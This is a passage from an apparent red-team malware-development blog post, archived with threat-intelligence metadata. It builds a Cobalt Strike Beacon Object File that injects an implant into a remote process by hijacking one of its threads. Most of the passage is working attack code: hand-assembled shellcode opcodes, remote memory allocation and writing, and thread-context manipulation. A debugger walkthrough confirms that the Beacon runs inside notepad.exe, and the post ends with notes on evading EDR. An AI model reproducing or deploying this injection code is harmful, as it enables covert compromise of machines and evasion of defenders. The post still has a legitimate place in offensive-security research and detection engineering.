record’s address is not visible to the remote process`\nwe are injecting into. Additionally, since `NtContinue does not accept a` `HANDLE`\nparameter, it expects the thread it will resume execution for is the current calling thread,\nwhich will be in the remote process. This means we will need to embed the `CONTEXT record`\ninto our final payload that will be injected into the remote process. Additionally, since\n```\nNtContinue restores execution of the calling thread, this is why we need to embed an\nNtContinue shellcode into the final payload that will be placed into the remote process.\n\n```\nThat way, when the hijacked thread executes the `NtContinue routine, restoration of the`\nhijacked thread will occur, since it is the calling thread. With that said, let’s get into\ndeveloping the routine.\n\nSynonymous with our `CreateThread routine, let’s create a 64-byte buffer and a new`\ncounter.\n```\nBYTE ntContinue[64] = { NULL };\nint i = 0;\n\n```\nAs mentioned earlier, this `NtContinue routine is going to be the piece of code that actually`\ninvokes the `CreateThread routine. When this` `NtContinue routine performs the call to`\nthe `CreateThread routine, it will push a return address on the stack, which will be the next`\ninstruction within this `NtContinue shellcode. When the` `CreateThread shellcode`\nperforms its return, execution will pick back up inside of the `NtContinue shellcode. With`\nthis in mind, let’s start by using a near call, which uses relative addressing, to call the\n```\nCreateThread shellcode.\n\n```\nThe first goal is to start off the `NtContinue routine with a call to the` `CreateThread`\nroutine. To do this, we first need to calculate the distance from this call instruction to the\nlocation of the `CreateThread shellcode. In order to properly do this, we need to take one`\nthing into consideration, and that is we need to also carry the preserved `CONTEXT record`\nwith us, for use, in the `NtContinue call. To do this, we will use a near call procedure. Near`\ncalls, in assembly, do not call an absolute address, like the address of a Windows API\nfunction, for instance. Instead, near call instructions can be used to call a function, relative to\nthe address in the instruction pointer. Essentially, if we can calculate the distance, in a\n```\nDWORD, to the CreateThread routine, we can just invoke the opcode 0xe8, along with a\nDWORD to represent the distance from the current memory location, in order to dynamically\n\n```\ncall the `CreateThread routine! The reason we are using a` `DWORD, which is a 32-bit value,`\nis because the x86 instruction set, which is usable by 64-bit systems, allows either a 16-bit or\n32-bit relative virtual address (RVA). However, this 32-bit value is sign extended to a 64-bit\nvalue on 64-bit systems. More information on the different calling mechanisms on x86_64\nsystems can be found [here. The offset to our shellcode will be the size of our](https://www.felixcloutier.com/x86/call) `NtContinue`\n\n\n-----\n\nroutine plus the size of a `CONTEXT record. This essentially will jump over the`\n```\nNtContinue code and the CONTEXT record, in order to first execute the CreatThread\n\n```\nroutine. The corresponding instructions we need, are as follows.\n```\n// First calculate the size of a CONTEXT record and NtContinue routine\n// Then, \"jump over shellcode\" by calling the buffer at an offset of the calculation\n(64 bytes + CONTEXT size)\n// 0xe8 is a near call, which uses RIP as the base address for RVA calculations and\ndynamically adds the offset specified by shellcodeOffset\nntContinue[i++] = 0xe8;\n// Subtracting to compensate for the near call opcode (represented by i) and the\nDWORD used for relative addressing\nDWORD shellcodeOffset = sizeof(ntContinue) + sizeof(CONTEXT) - sizeof(DWORD) - i;\nmycopy(ntContinue + i, &shellcodeOffset, sizeof(shellcodeOffset));\n// Update counter with location buffer can be written to\ni += sizeof(shellcodeOffset);\n\n```\nAlthough the above code practically represents what was said about, you can see that the\nsize of a `DWORD and the value of` `i are subtracted from the offset previously mentioned.`\nThis is because, the whole `NtContinue routine is 64 bytes. By the time the code has`\nfinished executing the entire `call instruction, a few things will have happened. The first`\nbeing, the call instruction itself, `0xe8, will have been executed. This takes us from being at`\nthe beginning of our routine, byte 1/64, to the second byte in our routine, byte 2/64. The\n```\nCreateThread routine, which we need to call, is now one byte closer than when we started\n\n```\n- and this will affect our calculations. In the above set of instructions, this byte has been\ncompensated for, by subtracting the already executed opcode (the current value of `i ).`\nAdditionally, four bytes are taken up by the actual offset itself, a DWORD, which is a 4 byte\nvalue. This means execution will now be at byte 5/64 (one byte for the opcode and four bytes\nfor the `DWORD ). To compensate for this, the size of a DWORD has been subtracted from the`\ntotal offset. If you think about it, this makes sense. By the time the call has finished\nexecuting, the `CreateThread routine will be five bytes closer. If we used the original offset,`\nwe would have overshot the `CreateThread routine by five bytes. Additionally, we update`\nthe `i counter variable to let it know how many bytes we have written to the overall`\n```\nNtContinue routine. We will walk through all of these instructions inside of the debugger,\n\n```\nonce we have finished developing this small shellcode routine.\n\nAt this point, the `NtContinue routine would have called the` `CreateThread routine. The`\n```\nCreateThread routine would have returned execution back to the NtContinue routine,\n\n```\nand the next instructions in the `NtContinue routine would execute.`\n\nThe next few instructions are a bit of a “hacky” method to pass the first parameter, a pointer\nto our `CONTEXT record, to the` `NtContinue function. We will use a` `call/pop routine,`\n[which is a very documented method and can be read about here and](https://www.boozallen.com/c/insight/blog/finding-the-instruction-pointer.html) [here. As we know, we](https://marcosvalle.github.io/osce/2018/05/06/JMP-CALL-POP-technique.html)\nare required to place the first value, for our purposes, into the RCX register - per the\n\n\n-----\n\n```\n__fastcall calling convention. This means we need to calculate the address of the\nCONTEXT record somehow. To do this, we actually use another near call instruction in order\n\n```\nto call the immediate byte after the call instruction.\n```\n// Near call instruction to call the address directly after, which is used to pop the\npushed return address onto the stack with a RVA from the same page (call pushes\nreturn address onto the stack)\nntContinue[i++] = 0xe8;\nntContinue[i++] = 0x00;\nntContinue[i++] = 0x00;\nntContinue[i++] = 0x00;\nntContinue[i++] = 0x00;\n\n```\nThe instruction this `call will execute is the immediate next instruction to be executed,`\nwhich will be a `pop rcx instruction added by us. Additionally the value of` `i at this point is`\nsaved into a new variable called `contextOffset .`\n```\n// The previous call instruction pushes a return address onto the stack\n// The return address will be the address, in memory, of the upcoming pop rcx\ninstruction\n// Since current execution is no longer at the beginning of the ntContinue routine,\nthe distance to the CONTEXT record is no longer 64-bytes\n// The address of the pop rcx instruction will be used as the base for RVA\ncalculations to determine the distance between the value in RCX (which will be the\naddress of the 'pop rcx' instruction) to the CONTEXT record\n// Obtaining the current amount of bytes executed thus far\nint contextOffset = i;\n// __fastcall calling convention\n// NtContinue requires a pointer to a context record and an alert state (FALSE in\nthis case)\n// pop rcx (get return address, which isn't needed for anything, into RCX for RVA\ncalculations)\nntContinue[i++] = 0x59;\n\n```\nThe purpose of this, is the `call instruction will push the address of the` `pop rcx`\ninstruction onto the stack. This is the return address of this function. Since the next\ninstruction directly after the `call is` `pop rcx, it will place the value at RSP, which is now`\nthe address of the `pop rcx instruction due to` `call POP_RCX_INSTRUCTION pushing it`\nonto the stack, into the RCX register. This helps us, as now we have a memory address that\nis relatively close the the `CONTEXT record, which will be located directly after the call to`\n```\nNtContinue .\n\n```\nNow, as we know, the original offset of the `CONTEXT record from the very beginning of the`\nentire `NtContinue routine was 64-bytes. This is because we will copy the` `CONTEXT`\nrecord directly after the 64-byte `BYTE array,` `ntContinue, in our final buffer. Right now`\nhowever, if we add 64-bytes, however, to the value in RCX, we will overshoot the `CONTEXT`\nrecord’s address. This is because we have executed quite a few instructions of the 64-byte\nshellcode, meaning we are now closer to the `CONTEXT record, than we where when we`\n\n\n-----\n\nstarted. To compensate for this, we can add the original 64-byte offset to the RCX register,\nand then subtract the `contextOffset value, which represents the total amount of opcodes`\nexecuted up until that point. This will give us the correct distance from our current location to\nthe `CONTEXT record.`\n```\n// The address of the pop rcx instruction is now in RCX\n// Adding the distance between the CONTEXT record and the current address in RCX\n// add rcx, distance to CONTEXT record\nntContinue[i++] = 0x48;\nntContinue[i++] = 0x83;\nntContinue[i++] = 0xc1;\n// Value to be added to RCX\n// The distance between the value in RCX (address of the 'pop rcx' instruction) and\nthe CONTEXT record can be found by subtracting the amount of bytes executed up until\nthe 'pop rcx' instruction and the original 64-byte offset\nntContinue[i++] = sizeof(ntContinue) - contextOffset;\n\n```\nThis will place the address of the `CONTEXT record into the RCX register. If this doesn’t`\ncompute, don’t worry. In a brief moment, we will step through everything inside of WinDbg to\nvisually put things together.\n\nThe next goal is to set the `RaiseAlert function argument to` `FALSE, which is a value of 0.`\nTo do this, again, we will use bitwise XOR.\n```\n// xor rdx, rdx\n// Set to FALSE\nntContinue[i++] = 0x48;\nntContinue[i++] = 0x31;\nntContinue[i++] = 0xd2;\n\n```\nAll that is left now is to call `NtContinue ! Again, just like our call to` `CreateThread, we can`\nresolve the address of the API inside of the current process and pass the return value to the\nremote process, as even though each process is mapped its own Windows DLLs, the\naddresses are the same across the system.\n\nThe `mov rax instruction set is first.`\n```\n// Place NtContinue into RAX\nntContinue[i++] = 0x48;\nntContinue[i++] = 0xb8;\n\n```\nWe then resolve the address of `NtContinue, Beacon Object File style.`\n\n\n-----\n\n```\n// Although the thread is in a remote process, the Windows DLLs mapped to the Beacon\nprocess, although private, will correlate to the same virtual address\nunsigned long long ntcontinueAddress =\nKERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA(\"ntdll\"), \"NtContinue\");\n// Error handling. If NtContinue cannot be resolved, abort\nif (ntcontinueAddress == NULL)\n{\n BeaconPrintf(CALLBACK_ERROR, \"Error! Unable to resolve NtContinue.\\n\",\nKERNEL32$GetLastError());\n}\n\n```\nUsing the custom `mycopy function, we then can copy the address of` `NtContinue at the`\ncorrect index within the `BYTE array, based on the value of` `i .`\n```\n// Copy the address of NtContinue function address to the NtContinue routine buffer\nmycopy(ntContinue + i, &ntcontinueAddress, sizeof(ntcontinueAddress));\n// Update the counter with the correct offset the next bytes should be written to\ni += sizeof(ntcontinueAddress);\n\n```\nAt this point, things are as easy as just allocating some stack space for good measure and\ncalling the value in RAX, `NtContinue !`\n```\n// Allocate some space on the stack for the call to NtContinue\n// sub rsp, 0x20\nntContinue[i++] = 0x48;\nntContinue[i++] = 0x83;\nntContinue[i++] = 0xec;\nntContinue[i++] = 0x20;\n// call NtContinue\nntContinue[i++] = 0xff;\nntContinue[i++] = 0xd0;\n\n```\nAll there is left now is the stack alignment routine inside of the call to `CreateThread ! This`\nalignment is to ensure the stack pointer is 16-byte aligned when the call from the\n```\nNtContinue routine invokes the CreateThread routine.\n\n## Will The Stars Align?\n\n```\nThe following routine will perform bitwise AND with the stack pointer, to ensure a 16-byte\naligned RSP value inside of the `CreateThread routine, by clearing out the last 4 bits of the`\naddress.\n```\n// Create 4 byte buffer to perform bitwise AND with RSP to ensure 16-byte aligned\nstack for the call to shellcode\n// and rsp, 0FFFFFFFFFFFFFFF0\nstackAlignment[0] = 0x48;\nstackAlignment[1] = 0x83;\nstackAlignment[2] = 0xe4;\nstackAlignment[3] = 0xf0;\n\n```\n\n-----\n\nAfter the stack alignment is completed, all there is left to do is invoke `malloc to create a`\nlarge buffer that will contain all of our custom routines, inject the final buffer, and call\n```\nSetThreadContext and ResumeThread to queue execution!\n// Allocating memory for final buffer\n// Size of NtContinue routine, CONTEXT structure, stack alignment routine, and\nCreateThread routine\nPVOID shellcodeFinal = (PVOID)MSVCRT$malloc(sizeof(ntContinue) + sizeof(CONTEXT) +\nsizeof(stackAlignment) + sizeof(createThread));\n// Copy NtContinue routine to final buffer\nmycopy(shellcodeFinal, ntContinue, sizeof(ntContinue));\n// Copying CONTEXT structure, stack alignment routine, and CreateThread routine to\nthe final buffer\n// Allocation is already a pointer (PVOID) - casting to a DWORD64 type, a 64-bit\naddress, in order to write to the buffer at a desired offset\n// Using RtlMoveMemory for the CONTEXT structure to avoid casting to something other\nthan a CONTEXT structure\nNTDLL$RtlMoveMemory((DWORD64)shellcodeFinal + sizeof(ntContinue), &cpuRegisters,\nsizeof(CONTEXT));\nmycopy((DWORD64)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT),\nstackAlignment, sizeof(stackAlignment));\nmycopy((DWORD64)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT) +\nsizeof(stackAlignment), createThread, sizeof(createThread));\n// Declare a variable to represent the final length\nint finalLength = (int)sizeof(ntContinue) + (int)sizeof(CONTEXT) +\nsizeof(stackAlignment) + sizeof(createThread);\n\n```\nBefore moving on, notice the call to `RtlMoveMemory when it comes to copying the`\n```\nCONTEXT record to the buffer. This is due to mycopy being prototyped to access the\n\n```\nsource and destination buffers as char* data types. However, `RtlMoveMemory is`\nprototyped to accept data types of `VOID UNALIGNED, which indicates pretty much any data`\ntype can be used, which is perfect for us as `CONTEXT is a structure, not a` `char* .`\n\nThe above code creates a buffer with the size of our routines, and copies it into the routine at\nthe correct offsets, with the `NtContinue routine being copied first, followed by the`\npreserved `CONTEXT record of the hijacked thread, the stack alignment routine, and the`\n```\nCreateThread routine. After this, the shellcode is injected into the remote process.\n\n```\nFirst, `VirtualAllocEx is called again.`\n\n\n-----\n\n```\n// Inject the shellcode into the target process with read/write permissions\nPVOID allocateMemory = KERNEL32$VirtualAllocEx(\n processHandle,\n NULL,\n finalLength,\n MEM_RESERVE | MEM_COMMIT,\n PAGE_EXECUTE_READWRITE\n);\nif (allocateMemory == NULL)\n{\n BeaconPrintf(CALLBACK_ERROR, \"Error! Unable to allocate memory in the remote\nprocess. Error: 0x%lx\\n\", KERNEL32$GetLastError());\n}\n\n```\nSecondly, `WriteProcessMemory is called to write the shellcode to the allocation.`\n```\n// Write shellcode to the new allocation\nBOOL writeMemory = KERNEL32$WriteProcessMemory(\n processHandle,\n allocateMemory,\n shellcodeFinal,\n finalLength,\n NULL\n);\nif (!writeMemory)\n{\n BeaconPrintf(CALLBACK_ERROR, \"Error! Unable to write memory to the buffer. Error:\n0x%llx\\n\", KERNEL32$GetLastError());\n}\n\n```\nAfter that, RSP and RIP are set before the call to `SetThreadContext . RIP will point to our`\nfinal buffer and upon thread restoration, the value in RIP will be executed.\n```\n// Allocate stack space by subtracting the stack by 0x2000 bytes\ncpuRegisters.Rsp -= 0x2000;\n// Change RIP to point to our shellcode and typecast buffer to a DWORD64 because that\nis what a CONTEXT structure uses\ncpuRegisters.Rip = (DWORD64)allocateMemory;\n\n```\nNotice that RSP is subtracted by `0x2000 bytes.` [@zerosum0x0’s blog post on](https://zerosum0x0.blogspot.com/2017/07/threadcontinue-reflective-injection.html)\n```\nThreadContinue adopts this feature, to allow breathing room on the stack in order for code\n\n```\nto execute, and I decided to adopt it as well in order to avoid heavy troubleshooting.\n\nAfter that, all there is left to do is to invoke `SetThreadContext,` `ResumeThread, and`\n```\nfree !\n\n```\n```\nSetThreadContext\n\n```\n\n-----\n\n```\n// Set RIP\nBOOL setRip = KERNEL32$SetThreadContext(\n desiredThread,\n &cpuRegisters\n);\n// Error handling\nif (!setRip)\n{\n BeaconPrintf(CALLBACK_ERROR, \"Error! Unable to set the target thread's RIP\nregister. Error: 0x%lx\\n\", KERNEL32$GetLastError());\n}\n\n```\n```\nResumeThread\n\n```\n```\n// Call to ResumeThread()\nDWORD resume = KERNEL32$ResumeThread(\n desiredThread\n);\n\n```\n```\nfree\n\n```\n```\n// Free the buffer used for the whole payload\nMSVCRT$free(\n shellcodeFinal\n);\n\n```\nAdditionally, you should always clean up handles in your code - but especially in Beacon\nObject Files, as they are “sensitive”.\n```\n// Close handle\nKERNEL32$CloseHandle(\n desiredThread\n);\n// Close handle\nKERNEL32$CloseHandle(\nprocessHandle\n);\n\n## Debugger Time\n\n```\nLet’s use an instance of `notepad.exe as our target process and attach it in WinDbg.`\n\n\n-----\n\nThe PID we want to inject into is `7548 for our purposes. After loading our Aggressor Script`\ndeveloped earlier, we can use the command `cThreadHijack 7548 TESTING, where`\n```\nTESTING is the name of the HTTP listener Beacon will interact with.\n\n```\n\n-----\n\nThere we go, our BOF successfully ran. Now, let’s examine what we are working with in\nWinDbg. As we can see, the address of our final buffer is shown in the `Current RIP:`\n```\n0x1f027f20000 output line. Let’s view this in WinDbg.\n\n```\n\n-----\n\nGreat! Everything seems to be in place. As is shown in the `mov rax,offset`\n```\nntdll!NtContinue instruction, we can see our NtContinue routine. The beginning of the\nNtContinue routine should call the address of the stack alignment and CreateThread\n\n```\nshellcode, as mentioned earlier in this blog post. Let’s see what the address\n```\n0x000001f027f20510 references, which is the memory address being called.\n\n```\nPerfect! As we can see by the `and rsp, 0FFFFFFFFFFFFFFFF0 instruction, along with the`\naddress of `KERNEL32!CreateThreadStub, the` `NtContinue routine will first call the stack`\nalignment and `CreateThread routines. In this case, we are good to go! Let’s start now`\nwalking through execution of the code.\n\n\n-----\n\nUpon `SetThreadContext being invoked, which changes the RIP register to execute our`\nshellcode, we can see that execution has reached the first `call, which will invoke the stack`\nalignment and `CreateThread routines. Stepping through this call, as we know, will push a`\nreturn address onto the stack. As mentioned previously, this will be the address of that next\n```\ncall 0x000001f027f2000a instruction. When the CreateThread routine returns, it will\n\n```\nreturn to this address. After stepping through the instruction, we can see that the address of\nthe next `call is pushed onto the stack.`\n\nExecution then reaches the bitwise AND instruction. As we can see from the above image,\n```\nand rsp, 0FFFFFFFFFFFFFFF0 is redundant, as the stack pointer is already 16-byte\n\n```\naligned (the last 4 bits are already set to 0). Stepping through the bitwise XOR operations,\nRCX and RDX are set to 0.\n\n\n-----\n\nAs we know from the `CreateThread prototype, the` `lpStartAddress parameter is a`\npointer to our shellcode. Looking at the above image, we can see the third argument, which\nwill be loaded into R8, is `0x1f027ee0000 . Unassembling this address in the debugger`\ndiscloses this is our Beacon implant, which was injected earlier! TO verify this, you can\ngenerate a raw Beacon stageless artifact in Cobalt Strike manually and run it through\n```\nhexdump to verify the first few opcodes correspond.\n\n```\nAfter stepping through the instruction, the value is loaded into the R8 register. The next\ninstruction sets R9 to 0 via `xor r9, r9 .`\n\n\n-----\n\nAdditionally, [RSP + 0x20] and [RSP + 0x28] are set to 0, by copying the value of R9, which\nis now 0, to these locations. Here is what [RSP + 0x20] and [RSP + 0x28] look like before the\n```\nmov [rsp + 0x20], r9 and mov [rsp + 0x28], r9 instructions and after.\n\n```\n\n-----\n\nAfter, `CreateThread is placed into RAX and is called. Note` `CreateThread is actually`\n```\nCreateThreadStub . This is because most former kernel32.dll functions were placed in\n\n```\na DLL called `KERNELBASE.DLL . These “stub” functions essentially just redirect execution to`\nthe correct `KERNELBASE.dll function.`\n\nStepping over the function, with `p in WinDbg, places the` `CreateThread return value, into`\nRAX - which is a handle to the local thread containing the Beacon implant.\n\nAfter execution of our `NtContinue routine is complete, we will receive the Beacon callback`\nas a result of this thread.\n\n\n-----\n\nAdditionally, we can see that RSP is set to the first real instruction of our `NtContinue`\nroutine. A `ret instruction, which is what is in RIP currently, will take the stack pointer (RSP)`\nand place it into RIP. Executing the return redirects execution back to the `NtContinue`\nroutine.\n\nAs we can see in the image above, the next `call instruction calls the` `pop rcx`\ninstruction. This `call instruction, when executed, will push the address of the` `pop rcx`\ninstruction onto the stack, as a return address.\n\n\n-----\n\nExecuting the `pop rcx instruction, we can see that RCX now contains the address, in`\nmemory, of the `pop rcx instruction. This will be the base address used in the RVA`\ncalculations to resolve the address of the preserved `CONTEXT record.`\n\n\n-----\n\nTo verify if our offset is correct, we can use `.cxr in WinDbg to divulge if the contiguous`\nmemory block located at RCX + 0x36 is in fact a `CONTEXT record.` `0x36 is chosen, as this`\nis the value currently that is about to be added to RCX, as seen a few screenshots ago.\nVerifying with WinDbg, we can see this is the case.\n\n\n-----\n\nIf this would not have been the correct location of the `CONTEXT record, this WinDbg`\nextension would have failed, as the memory block would not have been parsed correctly.\n\nNow that we have verified our `CONTEXT record is in the correct place, we can perform the`\nRVA calculation to add the correct distance to the `CONTEXT record, meaning the pointer is`\nthen stored in RCX, fulfilling the `PCONTEXT parameter of` `NtContinue .`\n\nStepping through `xor rdx, rdx, which sets the` `RaiseAlert parameter of` `NtContinue`\nto `FALSE, execution lands on the` `call rax instruction, which will call` `NtContinue .`\n\nPressing `g in the debugger then shows us quite a few of DLLs are mapped into`\n```\nnotepad.exe .\n\n```\n\n-----\n\nThis is the Beacon implant resolving needed DLLs for various function calls - meaning our\nBeacon implant has been executed! If we go back into Cobalt Strike, we can see we now\nhave a Beacon in context of `notepad.exe with the same PID of 7548!`\n\nAdditionally, you will notice on the victim machine that `notepad.exe is fully functional! We`\nhave successfully forced a remote thread to execute our payload and restored it, all in one\ngo.\n\n## Final Thoughts\n\nObviously, this technique isn’t without its flaws. There are still IOCs for this technique,\nincluding invoking `SetThreadContext, amongst other things. However, this does avoid`\ninvoking any sort of action that creates a remote thread, which is still useful in most\nsituations. This technique could be taken further, perhaps with invoking direct system calls\nversus invoking these APIs, which are susceptible to hooking, with most EDR products.\n\nAdditionally, one thing to note is that since this technique suspends a thread and then\nresumes it, you may have to wait a few moments to even a few minutes, in order for the\nthread to get around to executing. Interacting with the process directly will force execution,\nbut targeting Windows processes that perform execution often is a good target also to avoid\nlong waits.\n\nI had a lot of fun implementing this technique into a BOF and I am really glad I have a reason\nto write more C code! Like always: peace, love, and positivity :-).\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-09 - Malware Development- Leveraging Beacon Object Files for Remote Process Injection via Thread Hijacking.pdf"
    ],
    "report_names": [
        "2021-01-09 - Malware Development- Leveraging Beacon Object Files for Remote Process Injection via Thread Hijacking.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535961,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653752987,
    "ts_modification_date": 1653752987,
    "files": {
        "pdf": "https://archive.orkl.eu/50a1f68891aa9e9462667cc8b95fda0043c8164d.pdf",
        "text": "https://archive.orkl.eu/50a1f68891aa9e9462667cc8b95fda0043c8164d.txt",
        "img": "https://archive.orkl.eu/50a1f68891aa9e9462667cc8b95fda0043c8164d.jpg"
    }
}